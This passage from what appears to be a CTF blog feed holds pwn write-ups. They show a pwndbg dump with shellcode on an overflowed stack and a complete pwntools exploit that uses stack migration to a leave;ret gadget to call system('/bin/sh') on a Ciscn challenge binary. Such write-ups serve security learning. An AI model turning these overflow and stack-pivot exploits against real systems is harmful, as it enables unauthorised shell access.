number">0x0</span> RCX  <span class="token number">0xffffdce062626262</span> RDX  <span class="token number">0x7fffff</span> RDI  <span class="token number">0x7fffffffdcb4</span> â—‚â€” <span class="token number">0xffffdce062626262</span> RSI  <span class="token number">0x7fffffffdcd0</span> â—‚â€” <span class="token number">0xffffdce062626262</span> R8   <span class="token number">0x7ffff7f9e500</span> â—‚â€” add    ch<span class="token punctuation">,</span> ah <span class="token operator">/</span><span class="token operator">*</span> <span class="token number">0x7ffff7f9e500</span> <span class="token operator">*</span><span class="token operator">/</span> R9   <span class="token number">0x7fffffffdb67</span> â—‚â€” <span class="token number">0xa87c57a943ef0034</span> <span class="token operator">/</span><span class="token operator">*</span> <span class="token string">'4'</span> <span class="token operator">*</span><span class="token operator">/</span> R10  <span class="token number">0xfffffffffffff4a8</span> R11  <span class="token number">0x7ffff7f58a60</span> â—‚â€” add    byte ptr <span class="token punctuation">[</span>rdx<span class="token punctuation">]</span><span class="token punctuation">,</span> cl R12  <span class="token number">0x555555555090</span> â—‚â€” xor    ebp<span class="token punctuation">,</span> ebp R13  <span class="token number">0x7fffffffe190</span> â—‚â€” <span class="token number">0x1</span> R14  <span class="token number">0x0</span> R15  <span class="token number">0x0</span> RBP  <span class="token number">0x6262626262626262</span> <span class="token punctuation">(</span><span class="token string">'bbbbbbbb'</span><span class="token punctuation">)</span> RSP  <span class="token number">0x7fffffffdcb8</span> â€”â–¸ <span class="token number">0x7fffffffdce0</span> â—‚â€” <span class="token number">0x9090909090909090</span> RIP  <span class="token number">0x5555555551dc</span> â—‚â€” ret    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> DISASM <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   <span class="token number">0x5555555551ce</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe46</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551d5</span>    call   <span class="token number">0x555555555040</span>   <span class="token number">0x5555555551da</span>    nop       <span class="token number">0x5555555551db</span>    leave   â–º <span class="token number">0x5555555551dc</span>    ret    <span class="token operator">&lt;</span><span class="token number">0x7fffffffdce0</span><span class="token operator">></span>   <span class="token number">0x5555555551dd</span>    push   rbp   <span class="token number">0x5555555551de</span>    mov    rbp<span class="token punctuation">,</span> rsp   <span class="token number">0x5555555551e1</span>    sub    rsp<span class="token punctuation">,</span> <span class="token number">0x3f0</span>   <span class="token number">0x5555555551e8</span>    lea    rdi<span class="token punctuation">,</span> qword ptr <span class="token punctuation">[</span>rip <span class="token operator">+</span> <span class="token number">0xe31</span><span class="token punctuation">]</span>   <span class="token number">0x5555555551ef</span>    mov    eax<span class="token punctuation">,</span> <span class="token number">0</span>   <span class="token number">0x5555555551f4</span>    call   <span class="token number">0x555555555050</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> STACK <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0000</span>â”‚ rsp  <span class="token number">0x7fffffffdcb8</span> â€”â–¸ <span class="token number">0x7fffffffdce0</span> â—‚â€” <span class="token number">0x9090909090909090</span><span class="token number">01</span><span class="token punctuation">:</span><span class="token number">0008</span>â”‚      <span class="token number">0x7fffffffdcc0</span> â—‚â€” <span class="token number">0x6161616161616161</span> <span class="token punctuation">(</span><span class="token string">'aaaaaaaa'</span><span class="token punctuation">)</span><span class="token number">02</span><span class="token punctuation">:</span><span class="token number">0010</span>â”‚      <span class="token number">0x7fffffffdcc8</span> â—‚â€” <span class="token number">0x6262626261616161</span> <span class="token punctuation">(</span><span class="token string">'aaaabbbb'</span><span class="token punctuation">)</span><span class="token number">03</span><span class="token punctuation">:</span><span class="token number">0018</span>â”‚ rsi  <span class="token number">0x7fffffffdcd0</span> â—‚â€” <span class="token number">0xffffdce062626262</span><span class="token number">04</span><span class="token punctuation">:</span><span class="token number">0020</span>â”‚      <span class="token number">0x7fffffffdcd8</span> â—‚â€” <span class="token number">0x9090909000007fff</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">0028</span>â”‚      <span class="token number">0x7fffffffdce0</span> â—‚â€” <span class="token number">0x9090909090909090</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> â†“â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="token punctuation">[</span> BACKTRACE <span class="token punctuation">]</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f <span class="token number">0</span>     <span class="token number">5555555551dc</span>   f <span class="token number">1</span>     <span class="token number">7fffffffdce0</span>   f <span class="token number">2</span> <span class="token number">6161616161616161</span>   f <span class="token number">3</span> <span class="token number">6262626261616161</span>   f <span class="token number">4</span> ffffdce062626262   f <span class="token number">5</span> <span class="token number">9090909000007fff</span>   f <span class="token number">6</span> <span class="token number">9090909090909090</span>   f <span class="token number">7</span> <span class="token number">9090909090909090</span>   f <span class="token number">8</span> <span class="token number">9090909090909090</span>   f <span class="token number">9</span> b848686a90909090   f <span class="token number">10</span> <span class="token number">732f2f2f6e69622f</span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg<span class="token operator">></span> </code></pre><p><code>Exp Running Status</code>:</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719161033.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Binary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> Overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Ciscn_Pwn_Stack_Migration</title>
      <link href="/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
      <url>/2019/07/18/Ciscn-Pwn-Stack-Migration/</url>
      
        <content type="html"><![CDATA[<p>Stack migration in Ciscnâ€¦</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><h2 id="Main-Source-Code"><a href="#Main-Source-Code" class="headerlink" title="Main Source Code"></a>Main Source Code</h2><p>main:</p><pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> <span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 public main<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> main            proc near               <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> _start<span class="token operator">+</span><span class="token number">17</span>â†‘o<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> var_4           <span class="token operator">=</span> dword ptr <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argc            <span class="token operator">=</span> dword ptr  <span class="token number">8</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> argv            <span class="token operator">=</span> dword ptr  0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> envp            <span class="token operator">=</span> dword ptr  10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span> <span class="token punctuation">;</span> __unwind <span class="token punctuation">{</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">080485FF</span>                 lea     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048603</span>                 and     esp<span class="token punctuation">,</span> 0FFFFFFF0h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048606</span>                 push    dword ptr <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048609</span>                 push    ebp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860A                 mov     ebp<span class="token punctuation">,</span> esp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860C                 push    ecx<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804860D                 sub     esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048610</span>                 call    init<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048615</span>                 sub     esp<span class="token punctuation">,</span> 0Ch<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048618</span>                 push    offset s        <span class="token punctuation">;</span> <span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804861D                 call    _puts<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048622</span>                 add     esp<span class="token punctuation">,</span> 10h<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048625</span>                 call    vul<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0804862A                 mov     eax<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">0804862F</span>                 mov     ecx<span class="token punctuation">,</span> <span class="token punctuation">[</span>ebp<span class="token operator">+</span>var_4<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048632</span>                 leave<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048633</span>                 lea     esp<span class="token punctuation">,</span> <span class="token punctuation">[</span>ecx<span class="token number">-4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span>                 retn<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> <span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// starts at 80485FF</span><span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span> main            endp<span class="token punctuation">.</span>text<span class="token punctuation">:</span><span class="token number">08048636</span></code></pre><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome, my friend. What's your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>vul:</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-28h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Statusâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ EAX  0x30 EBX  0x0 ECX  0xfff9442c â—‚â€” 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 â—‚â€” 0x0 EDI  0xf7ee1000 â—‚â€” 0x1d9d6c ESI  0xf7ee1000 â—‚â€” 0x1d9d6c EBP  0xfff969a8 â€”â–¸ 0x804af00 â—‚â€” 0x0 ESP  0xfff96980 â—‚â€” 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) â—‚â€” leave  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     â–º 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebpâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp  0xfff96980 â—‚â€” 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... â†“â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0  80485fd vul+104â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€Breakpoint *vul+104pwndbg> stack 2000:0000â”‚ esp  0xfff96980 â—‚â€” 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... â†“0a:0028â”‚ ebp  0xfff969a8 â€”â–¸ 0x804af00 â—‚â€” 0x00b:002câ”‚      0xfff969ac â€”â–¸ 0x804859b (vul+6) â—‚â€” sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000â”‚ esp  0x804aed8 â€”â–¸ 0x8048400 (system@plt) â—‚â€” jmp    dword ptr [0x804a018]01:0004â”‚      0x804aedc â—‚â€” 0x002:0008â”‚      0x804aee0 â€”â–¸ 0x804aee8 â—‚â€” '/bin/sh'03:000câ”‚      0x804aee4 â—‚â€” 0x004:0010â”‚      0x804aee8 â—‚â€” '/bin/sh'05:0014â”‚      0x804aeec â—‚â€” 0x68732f /* '/sh' */06:0018â”‚      0x804aef0 â—‚â€” 0x0... â†“0a:0028â”‚      0x804af00 â€”â–¸ 0x804aed4 â—‚â€” 0x00b:002câ”‚      0x804af04 â€”â–¸ 0x80484b8 (deregister_tm_clones+40) â—‚â€” leave  0c:0030â”‚      0x804af08 â—‚â€” 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Mindï¼š</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190719201500.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Ciscn </tag>
            
